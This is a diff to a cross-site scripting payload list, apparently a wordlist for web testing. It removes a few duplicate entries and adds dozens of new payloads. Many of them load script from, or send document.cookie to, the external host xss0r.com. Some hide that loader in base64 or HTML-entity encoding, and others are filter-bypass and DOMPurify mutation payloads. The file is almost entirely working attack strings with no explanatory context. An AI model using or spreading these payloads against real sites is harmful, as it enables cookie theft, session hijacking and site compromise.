@@ -4017,7 +4017,6 @@ javascript:fetch("https://xss0r.com/c/micro")
 '"<link rel="stylesheet" href="https://xss0r.com/c/micro" onerror='fetch("https://xss0r.com/c/micro")'>
 '"<meta http-equiv="refresh" content="0;url=https://xss0r.com/c/micro">
 '"<object data="https://xss0r.com/c/micro" onerror='this.data="https://xss0r.com/c/micro"'></object>
-javascript:fetch("https://xss0r.com/c/micro")
 '"<svg/onload="fetch('https://xss0r.com/c/micro'">
 {constructor.constructor('fetch("https://xss0r.com/c/micro"')()}
 '"<img src=x onerror="fetch('https://xss0r.com/c/micro')">
@@ -4046,7 +4045,6 @@ email%5D=zer0_sec+1%22%3E%3Cscript+src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fmicro%
 \"><input autofocus nope="%26quot;x%26quot;" onfocus="frames.location='https://xss0r.com/c/micro?c='+Reflect.get(document,'coo'+'kie')">
 \"></script><img src="x" onerror="with(document)body.appendChild(createElement('script')).src='https://xss0r.com/c/micro'">
 <p><img src="https://xss0r.com/c/micro" border="0" />--&gt;</p>
-'"></title></textarea></script></style></noscript><script src=https://xss0r.com/c/micro></script>
 <script>$.getScript("https://xss0r.com/c/micro")</script>
 ‘;"/></textarea></script><script src=//xss0r.com/c/micro>
 zer0_sec+1%22%3E%3Cscript+src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fmicro%22%3E%3C%2Fscript%3E%40ibro1337%40gmail.com
@@ -4055,13 +4053,11 @@ ibro1337%40gmail.com%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fmic
 ibro1337@gmail.com"><script src="https://xss0r.com/c/micro"></script>
 {globalThis.constructor("fetch('https://xss0r.com/c/micro?cookie='+document.cookie)")()}
 ibro1337@gmail.com<!--" --><script src=https://xss0r.com/c/micro></script>
-ibro1337%40gmail.com%22%3E%3Cscript%20src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fmicro%22%3E%3C%2Fscript%3E
 ibro1337@gmail.com"><svg onload="fetch('https://xss0r.com/c/micro?cookie='+document.cookie)"></svg>
 <iframe src="https://xss0r.com" onload="fetch('https://xss0r.com/c/micro?cookie=' + document.cookie)"></iframe>
 </script><Iframe SrcDoc="><script src=https://xss0r.com/c/micro></script>">
 %3C%2Fscript%3E%3CIframe%20SrcDoc%3D%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fmicro%3E%3C%2Fscript%3E%22%3E
 %253C%252Fscript%253E%253CIframe%2520SrcDoc%253D%2522%253E%253Cscript%2520src%253Dhttps%253A%252F%252Fxss0r.com%252Fc%252Fmicro%253E%253C%252Fscript%253E%2522%253E
---></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss0r.com/c/micro"></scrIpt>
 --%3E%3C%2FtiTle%3E%3C%2FstYle%3E%3C%2FtexTarea%3E%3C%2FscrIpt%3E%22%2F%2F%27%2F%2F%3E%3CscrIpt%20src%3D%22https%3A%2F%2Fxss0r.com%2Fc%2Fmicro%22%3E%3C%2Fscript%3E
 --%253E%253C%252FtiTle%253E%253C%252FstYle%253E%253C%252FtexTarea%253E%253C%252FscrIpt%253E%2522%252F%252F%2527%252F%252F%253E%253CscrIpt%2520src%253D%2522https%253A%252F%252Fxss0r.com%252Fc%252Fmicro%2522%253E%253C%252Fscript%253E
 javascript://%27%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fmicro%3E%3C%2Fscript%3E
@@ -4070,3 +4066,75 @@ javascript://%22%3E%3Cscript%20src%3Dhttps%3A%2F%2Fxss0r.com%2Fc%2Fmicro%3E%3C%2
 javascript://%27%22%3E%3Csvg%20onmouseover%3D%22fetch('https://xss0r.com/c/micro?data='+document.cookie)%22%3E%3C%2Fsvg%3E
 javascript:/*'/*`/*\" /*</title></style></textarea></noscript></noembed></template></script/-->&lt;svg/onload=/*<html/*/onmouseover=fetch('https://xss0r.com/c/micro?cookie='+document.cookie)//>
 javascript://</script></textarea></style></noscript></noembed></script></template>&lt;svg/onload=/*fetch('https://xss0r.com/c/micro?cookie='+document.cookie)/*--><html */ onmouseover=alert()//>
+<a%2Fonmouseover%3D(confirm)(document.URL)>a
+"><​script>alert(1)<​/script>
+"><img src=x onerror​=alert(1)>
+"><video src onerror​=alert(1)>
+"><audio src onerror​=alert(1)>
+"><svg/onload​=alert(1)>
+"><body/onload​=alert(1)>
+"><input/onfocus​=alert(1)>
+"><div onpointerover​=alert(1)>
+"><b onmouseover​=alert(1)>hover
+<input type="hidden" oncontentvisibilityautostatechange​="alert(/ChromeCanary/)" style="content-visibility:auto">
+<p oncontentvisibilityautostatechange​="alert(/FirefoxOnly/)" style="content-visibility:auto">
+`-alert(1)”>’onload=”`<svg/1=’
+">'-alert(1)-'<svg>
+">alert(1)-"<svg>
+‘-alert(1)-’<svg><!V
+';alert(1);var myObj='
+alert&#x28;1&#x29
+");alert('xss');
+')alert('xss');
+‘;alert(/xss/)///
+);alert(Xss);//
+'); alert('XSS
+\";;alert(';XSS';);//
+“};alert(23);a={“a”:
+<img+border=3+alt=jaVasCript:/*-/*`/*\`/*&#039;/*&quot;/**/(/*+*/oNcliCk=alert()+)////&lt;/stYle/&lt;/titLe/&lt;/teXtarEa/&lt;/scRipt/--!&gt;\x3csVg/&lt;sVg/oNloAd=confirm('xssor')//&gt;\x3e>
+?alert(1)",
+?alert(1)”,
+">\]<img src=x onerror=alert(document.cookie)>
+setTimeout`alert\u0028document.domain\u0029`;
+<script>throw onerror=alert,'some string',123,'haha'</script>
+<script>throw/a/,Uncaught=1,g=alert,a=URL+0,onerror=eval,/1/g+a[12]+[1337]+a[13]</script>
+<script>TypeError.prototype.name ='=/',0[onerror=eval]['/-alert(1)//']</script>
+\"><svg%20onload=alert%26%230000000040\"1\")>
+%253C%252Fscript%253E%253Cscript%253Ealert%2528%2527Click%2520ME%2521%2527%2529%253C%252Fscript%253E
+</title><scRipt>alert(0x00C57D)</scRipt>
+<iMg src%3dN onerror%3dalert(0x000D98)>
+'"><script src=https://xss0r.com/c/ibro1337></script>
+"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaWJybzEzMzciO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7Og&#61;&#61;; onerror=eval(atob(this.id))>
+"><input onfocus=eval(atob(this.id)) id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaWJybzEzMzciO2RvY3VtZW50LmJvZHkuYXBwZW5kQ2hpbGQoYSk7Og&#61;&#61;; autofocus>
+"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;&#118;&#97;&#114;&#32;&#97;&#61;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#99;&#114;&#101;&#97;&#116;&#101;&#69;&#108;&#101;&#109;&#101;&#110;&#116;&#40;&#34;&#115;&#99;&#114;&#105;&#112;&#116;&#34;&#41;&#59;&#97;&#46;&#115;&#114;&#99;&#61;&#34;&#104;&#116;&#116;&#112;&#115;&#58;&#47;&#47;&#120;&#115;&#115;&#48;&#114;&#46;&#99;&#111;&#109;&#47;&#99;&#47;&#105;&#98;&#114;&#111;&#49;&#51;&#51;&#55;&#34;&#59;&#112;&#97;&#114;&#101;&#110;&#116;&#46;&#100;&#111;&#99;&#117;&#109;&#101;&#110;&#116;&#46;&#98;&#111;&#100;&#121;&#46;&#97;&#112;&#112;&#101;&#110;&#100;&#67;&#104;&#105;&#108;&#100;&#40;&#97;&#41;&#59;&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">
+<script>$.getScript("//xss0r.com/c/ibro1337")</script>
+'"></Title/</StYle/</TeXtarEa/</ScRipt/</NoScRiPt/</SeLeCt/</OpTiOn/</Svg/''"><svg/onload=javascript:eval(atob('dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8veHNzMHIuY29tL2MvaWJybzEzMzciO2RvY3VtZW50LmJvZHkuYXBwZW5kKGEpOw=='))//
+'"<img src="https://xss0r.com/c/ibro1337" onerror='this.src="https://xss0r.com/c/ibro1337"'>
+'"<iframe src='javascript:window.location="https://xss0r.com/c/ibro1337"'></iframe>
+'"<iframe srcdoc='<script>window.location="https://xss0r.com/c/ibro1337"</script>'></iframe>
+--></tiTle></stYle></texTarea></scrIpt>"//'//><scrIpt src="https://xss0r.com/c/ibro1337"></scrIpt>
+javascript<TAB>:alert(1) 
+javascript://’//” →</textarea></style></script></title><b onclick= alert()//>*/alert()/*
+(javascript:this;alert(1))
+(javascript:this;alert(1&#41;)
+&amp;#39;&amp;#88;&amp;#83;&amp;#83;&amp;#39;&amp;#41;&gt;
+“> <BODY ONLOAD=”a();”><SCRIPT>function a(){alert(‘X12SS’);}</SCRIPT><”
+'-alert/*any*/(1)-' 
+"><SVG ONLOAD=&#97&#108&#101&#114&#116(&#x64&#x6f&#x63&#x75&#x6d&#x65&#x6e&#x74&#x2e&#x64&#x6f&#x6d&#x61&#x69&#x6e)>.asp
+)alert(1);//
+%22%3e%3c%5K/onwheel=alert(1)%3eClick%20ME%3c%21--
+javascript:alert'1
+<title>&lt/title&gt&ltimg&sol;src=&quot&quotonerror&equals;alert(1)&gt
+< "a<noscript><p id="</noscript><img src=x onerror=alert(1)>"></p></noscript>
+> DOMPurify.sanitize("a<noscript><p id='</noscript><img src=x onerror=alert(1)>'></p></noscript>", {ADD_TAGS: ['noscript']});
+<svg></p><style><g title="</style><img src onerror=alert(1)>">
+<math><mtext><table><mglyph><style><!--</style><img title="--&gt;&lt;img src=1 onerror=alert(1)&gt;">
+<math><mtext><a title='one'><audio>aa<altglyphdef><animatecolor><filter><fieldset><a title='two'></fieldset>ccd</a>gg<mglyph><svg><mtext><style><a title='</style><img src=# onerror=alert(1)>'>
+<xmp><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>
+<iframe><svg><b><style><b title='</style><img src=x onerror=alert(1)>'>
+`${alert(1)}`
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+<marquee onStart marquee onStart="javascript:javascript:alert(1)"></marquee onStart>
+"/><img/onerror=\x09javascript:alert(1)\x09src=xxx:x />
+%3Cbutton%20onclick%3D%60alert%28%2FXSS%2F%29%60%3EClick%20ME%3C%2Fbutton%3E
+ddd");<​/script><​script>alert("XSS");<​/script><​script>aaa("
